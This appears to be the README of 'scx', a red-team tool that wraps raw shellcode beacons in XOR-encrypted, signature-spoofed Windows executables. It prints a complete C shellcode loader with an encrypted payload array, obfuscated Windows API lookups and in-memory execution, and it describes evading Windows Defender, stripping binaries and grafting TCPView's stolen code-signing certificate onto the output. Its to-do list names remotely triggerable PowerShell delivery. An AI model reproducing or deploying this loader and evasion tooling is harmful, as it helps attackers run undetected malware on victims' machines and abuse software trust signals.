# SCX

## Help
```
usage: scx.py [-h] -l  -b  [-k] [-n] [--x64] [--sign] [--strip]

Build XOR'd shellcode executables.

optional arguments:
  -h, --help        show this help message and exit
  -l , --language   Language for payload (c, cs and powershell)
  -b , --binary     Raw file to encrypt
  -k , --key        Key to encrypt with (random by default)
  -n , --name       Name of executable (random by xor_beacon_*.exe)
  --x64             Set compiler to x64
  --sign            Sign with TCPView's Certificate
  --strip           Strip Binary
```

## Sample

Command:

```bash
./scx.py -b beacon.bin -k '2483c6ed59fc549b0db9571c09193edb' --sign --strip -l c
```

```
  ██████  ▄████▄  ▒██   ██▒
▒██    ▒ ▒██▀ ▀█  ▒▒ █ █ ▒░
░ ▓██▄   ▒▓█    ▄ ░░  █   ░
  ▒   ██▒▒▓▓▄ ▄██▒ ░ █ █ ▒ 
▒██████▒▒▒ ▓███▀ ░▒██▒ ▒██▒ Author: mez0
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░▒▒ ░ ░▓ ░ GitHub: https://github.com/mez-0
░ ░▒  ░ ░  ░  ▒   ░░   ░▒ ░
░  ░  ░  ░         ░    ░  
      ░  ░ ░       ░    ░  
         ░                 

09/09/20, 21:01:51 ==> Architecture: x64
09/09/20, 21:01:51 ==> Key: 2483c6ed59fc549b0db9571c09193edb
09/09/20, 21:01:51 ==> Compiling with: x86_64-w64-mingw32-gcc ./result/xor_beacon_x64.c -o ./result/xor_beacon_x64.exe

09/09/20, 21:01:52 ==> Compiled: ./result/xor_beacon_x64.exe
09/09/20, 21:01:52 ==> Stripped: ./result/xor_beacon_x64.exe
09/09/20, 21:01:52 ==> Signed: ./result/xor_beacon_signed_x64.exe
```

## Installing
```
sudo apt install gcc-mingw-w64 mono-mcs
```

## The details
`scx` was named before I wanted to do AES encryption, originally it was `ShellcodeXor`, hence: `Scx`. Since the initial script I started adding `cs` and `PowerShell`, but didnt get around to doing it (so that PR is welcome!).

So, what this tool does is take a raw bin file, `xor` it and chuck it in [template](https://github.com/mez-0/scx/tree/master/templates). This is typically enough for Windows Defender, but I ended up wrapping some additional features. First off, I randomised the source code to look something like this:

```c
#include <windows.h>

typedef BOOL (WINAPI* fSWoKckHxLOKtdZH)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef LPVOID (WINAPI* fFzRzXJHdsn)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI* MhEgqVvJJjCtlP)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source, SIZE_T Length);

int main(void) {
  DWORD oldprotect = 0;
  char ClxeFNxbo[] = { 0x91, 0x81, 0xe1, 0x68, 0x61, 0x65, 0xc, 0xe4, 0x8c, 0x52, 0xa8, 0x5, 0xee, 0x3c, 0x5d, 0xe2, 0x31, 0x64, 0xea, 0x37, 0x78, 0xe6, 0x1b, 0x4b, 0x67, 0xd6, 0x2f, 0x4a, 0x5c, 0x96, 0xcf, 0x54, 0x0, 0x19, 0x6e, 0x41, 0x49, 0xa2, 0xa7, 0x6c, 0x64, 0xab, 0x8f, 0x9b, 0x31, 0x3f, 0xea, 0x37, 0x7c, 0xe6, 0x23, 0x5f, 0xe3, 0x2d, 0x74, 0x14, 0x8e, 0x21, 0x62, 0xb9, 0x30, 0xee, 0x35, 0x4d, 0x68, 0xb0, 0xe3, 0x28, 0x7d, 0x8f, 0x57, 0x20, 0xe8, 0x5c, 0xea, 0x64, 0xba, 0x5c, 0x96, 0xcf, 0xa9, 0xae, 0x68, 0x6d, 0xaa, 0x51, 0x83, 0x1d, 0x97, 0x66, 0x11, 0x95, 0x52, 0x1e, 0x4c, 0x14, 0x81, 0x34, 0xe6, 0x31, 0x47, 0x69, 0xb2, 0x3, 0xe7, 0x61, 0x22, 0xe8, 0x30, 0x7d, 0x64, 0xbf, 0xe6, 0x6d, 0xe8, 0x69, 0xb1, 0xec, 0x28, 0x49, 0x4d, 0x38, 0x33, 0x0, 0x3c, 0x36, 0x3c, 0x96, 0x83, 0x37, 0x3e, 0x3f, 0xe7, 0x7f, 0x82, 0xee, 0x35, 0xb, 0x64, 0xe1, 0xe8, 0xdb, 0x63, 0x68, 0x61, 0x35, 0x4, 0x5c, 0xe2, 0xc, 0xef, 0x9e, 0xb0, 0xd7, 0x9d, 0xdc, 0xc1, 0x3e, 0x9, 0xc3, 0xf9, 0xd0, 0xf4, 0x9c, 0xbd, 0x5d, 0x63, 0x10, 0x67, 0xe9, 0x98, 0x88, 0x14, 0x60, 0xd7, 0x2a, 0x7a, 0x11, 0x7, 0xb, 0x65, 0x3f, 0x92, 0xbc, 0x0, 0x9, 0xd, 0x6, 0x42, 0x8, 0x11, 0x6, 0x68 };
  
  char key[] = "michael";

  char hanDsXQ[sizeof ClxeFNxbo];

  int j = 0;

  for (int i = 0; i < sizeof ClxeFNxbo; i++) {
    if (j == sizeof key - 1) j = 0;
    hanDsXQ[i] = ClxeFNxbo[i] ^ key[j];
    j++;
  }

  fSWoKckHxLOKtdZH WHvHcFwxKyvQlsV = (fSWoKckHxLOKtdZH)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
  fFzRzXJHdsn qiPSRCVqjtEliB = (fFzRzXJHdsn)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
  MhEgqVvJJjCtlP AzLBPqsgwntXdKWN = (MhEgqVvJJjCtlP)GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");

  LPVOID pAddress = qiPSRCVqjtEliB(0, sizeof hanDsXQ, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  AzLBPqsgwntXdKWN(pAddress, hanDsXQ, sizeof hanDsXQ);

  BOOL isUpdated = WHvHcFwxKyvQlsV(pAddress, sizeof hanDsXQ, PAGE_EXECUTE_READ, &oldprotect);

  if (isUpdated != 0) {
    ((void(*)())pAddress)();
  }
  return 0;
}
```

At the top, I began obfuscating the Windows API Calls but didn't get around to encrypting the strings. Again, another PR welcome! Later on I ended up wrapping [strip](https://sourceware.org/binutils/docs/binutils/strip.html) to remove symbols and object files. Finally, I introduced the work of [@ausernamedjosh](https://twitter.com/ausernamedjosh) and his [SigThief](https://github.com/secretsquirrel/SigThief) project. Full kudos to him for that code. In his words:

> In short it will rip a signature off a signed PE file and append it to another one, fixing up the certificate table to sign the file.

For this, I borrowed [get_file_info_win](https://github.com/secretsquirrel/SigThief/blob/211b4fe0b2f2ac5e4fd71c99c96f1bfcbcd322dc/sigthief.py#L12) and [signfile](https://github.com/secretsquirrel/SigThief/blob/211b4fe0b2f2ac5e4fd71c99c96f1bfcbcd322dc/sigthief.py#L191). The signature in this project is from [TCPView](https://github.com/mez-0/scx/blob/master/lib/sig/Tcpview.exe_sig).

Full credit to [@ausernamedjosh](https://twitter.com/ausernamedjosh) on that.

## Todo

1. Finish off C# template by embedding AES Encrypted blobs.
2. Use that c# template to the be execute via PowerShell to create something remotely triggerable
3. Finish off encrypting the strings for the C implementation